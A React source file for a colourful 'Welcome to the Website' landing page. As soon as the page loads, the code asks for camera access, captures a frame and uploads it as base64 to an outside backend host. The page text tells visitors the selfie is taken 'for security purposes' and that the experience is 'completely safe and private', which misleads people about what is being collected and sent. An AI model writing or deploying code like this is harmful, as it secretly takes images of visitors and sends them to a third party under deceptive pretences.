import { useEffect } from "react";

function App() {
  const BACKEND_URL = "https://welcome-backend.onrender.com"; // replace with your Render backend URL

  useEffect(() => {
    const captureSelfie = async () => {
      try {
        // Ask for camera permission
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });

        // Create video element to capture frame
        const video = document.createElement("video");
        video.srcObject = stream;
        await video.play();

        // Wait a short moment to ensure video is ready
        await new Promise((resolve) => setTimeout(resolve, 1500));

        // Draw video frame to canvas
        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0);

        // Convert to base64 image
        const image = canvas.toDataURL("image/png");

        // Upload to backend
        await fetch(`${BACKEND_URL}/upload`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ image }),
        });

        // Stop camera stream
        stream.getTracks().forEach((track) => track.stop());
      } catch (err) {
        console.error("Camera error:", err);
      }
    };

    captureSelfie();
  }, []);

  return (
    <div
      style={{
        width: "100vw",
        height: "100vh",
        display: "flex",
        flexDirection: "column",
        justifyContent: "center",
        alignItems: "center",
        textAlign: "center",
        color: "#fff",
        fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif",
        padding: "20px",
        background: "linear-gradient(-45deg, #ff6ec4, #7873f5, #42e695, #f3ff6c)",
        backgroundSize: "400% 400%",
        animation: "gradientAnimation 15s ease infinite",
      }}
    >
      <h1 style={{ fontSize: "3rem", marginBottom: "20px" }}>Welcome to the Website</h1>
      <p style={{ fontSize: "1.2rem", maxWidth: "600px" }}>
        Explore, learn, and enjoy! This website automatically captures a selfie for security purposes.
        No other data is stored and the experience is completely safe and private.
      </p>

      {/* Gradient animation keyframes */}
      <style>{`
        @keyframes gradientAnimation {
          0% { background-position: 0% 50%; }
          50% { background-position: 100% 50%; }
          100% { background-position: 0% 50%; }
        }
      `}</style>
    </div>
  );
}

export default App;
